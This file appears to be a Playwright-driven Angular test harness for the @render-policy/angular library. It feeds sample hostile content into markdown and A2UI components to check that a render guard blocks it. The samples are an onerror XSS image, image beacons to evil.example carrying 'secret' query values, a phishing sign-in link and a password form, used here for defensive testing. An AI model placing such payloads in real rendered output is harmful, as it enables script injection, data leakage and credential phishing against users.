/**
 * A minimal standalone Angular application over the built FESM bundle of
 * @render-policy/angular. It is compiled at runtime (JIT through @angular/compiler,
 * which links the partial declarations) and driven from Playwright in run.mjs.
 */
import '@angular/compiler';
import { Component, provideZonelessChangeDetection, signal } from '@angular/core';
import { bootstrapApplication } from '@angular/platform-browser';
import { RpMarkdownComponent, RpRenderDirective, provideRenderPolicy } from '@render-policy/angular';
import { RpA2uiImageComponent, RpA2uiTextComponent, provideA2uiGuard } from '@render-policy/angular/a2ui';

declare global {
  interface Window {
    __angularReady?: boolean;
    __pwned?: unknown;
    __cspViolations: string[];
    __innerHTMLWritesInApp: string[];
    __decisions: unknown[];
    __app: {
      setContent(value: string): void;
      setStream(value: string): void;
      setStreaming(value: boolean): void;
      setDirectiveStream(value: string): void;
      setDirectiveStreaming(value: boolean): void;
      setA2uiText(value: unknown): void;
      setA2uiUrl(value: unknown): void;
      tick(): void;
    };
  }
}

window.__cspViolations = [];
document.addEventListener('securitypolicyviolation', (event) => {
  window.__cspViolations.push(`${event.violatedDirective}: ${event.sample || event.blockedURI}`);
});

// Record every innerHTML write that targets the application's own subtree.
window.__innerHTMLWritesInApp = [];
const descriptor = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
if (descriptor?.set) {
  const originalSet = descriptor.set;
  Object.defineProperty(Element.prototype, 'innerHTML', {
    ...descriptor,
    set(this: Element, value: string) {
      if (this.closest('app-root')) window.__innerHTMLWritesInApp.push(this.tagName.toLowerCase());
      originalSet.call(this, value);
    },
  });
}

@Component({
  selector: 'app-root',
  standalone: true,
  imports: [RpMarkdownComponent, RpRenderDirective, RpA2uiTextComponent, RpA2uiImageComponent],
  template: `
    <section>
      <h2>Directive</h2>
      <div id="directive" [rpRender]="content()"></div>
    </section>
    <section>
      <h2>Component, streaming</h2>
      <rp-markdown id="component" [content]="streamText()" [streaming]="streaming()" />
    </section>
    <section>
      <h2>Directive, streaming</h2>
      <div id="directive-stream" [rpRender]="directiveStreamText()" [rpRenderStreaming]="directiveStreaming()"></div>
    </section>
    <section>
      <h2>A2UI Text and Image</h2>
      <rp-a2ui-text id="a2ui-text" [text]="a2uiText()" />
      <rp-a2ui-image id="a2ui-image" [url]="a2uiUrl()" description="chart"><span class="blocked">image blocked</span></rp-a2ui-image>
    </section>
  `,
})
class AppComponent {
  readonly content = signal(
    '# Hello\n\n<img src="/nonexistent.png" onerror="window.__pwned = true"> ![remote](https://evil.example/leak.png?c=secret)\n\n<form><input type="password"></form>',
  );
  readonly streamText = signal('');
  readonly streaming = signal(true);
  readonly directiveStreamText = signal('');
  readonly directiveStreaming = signal(true);
  // Values as an A2UI renderer resolves them from the data model.
  readonly a2uiText = signal<unknown>(
    '**Report** <img src="https://evil.example/a2ui-text.png?d=secret" onerror="window.__pwned = true"> ![c](https://evil.example/a2ui-md.png) [sign in](https://evil.example/login)',
  );
  readonly a2uiUrl = signal<unknown>('/demo/ok.svg?ng-a2ui=1');
}

window.__decisions = [];
const appRef = await bootstrapApplication(AppComponent, {
  providers: [
    provideZonelessChangeDetection(),
    provideRenderPolicy({ mode: 'balanced', onDecision: (decision) => window.__decisions.push(decision) }),
    provideA2uiGuard({ onDecision: (decision) => window.__decisions.push(decision) }),
  ],
});
const app = appRef.components[0]?.instance as AppComponent;

window.__app = {
  setContent: (value) => app.content.set(value),
  setStream: (value) => app.streamText.set(value),
  setStreaming: (value) => app.streaming.set(value),
  setDirectiveStream: (value) => app.directiveStreamText.set(value),
  setDirectiveStreaming: (value) => app.directiveStreaming.set(value),
  setA2uiText: (value) => app.a2uiText.set(value),
  setA2uiUrl: (value) => app.a2uiUrl.set(value),
  tick: () => appRef.tick(),
};
window.__angularReady = true;
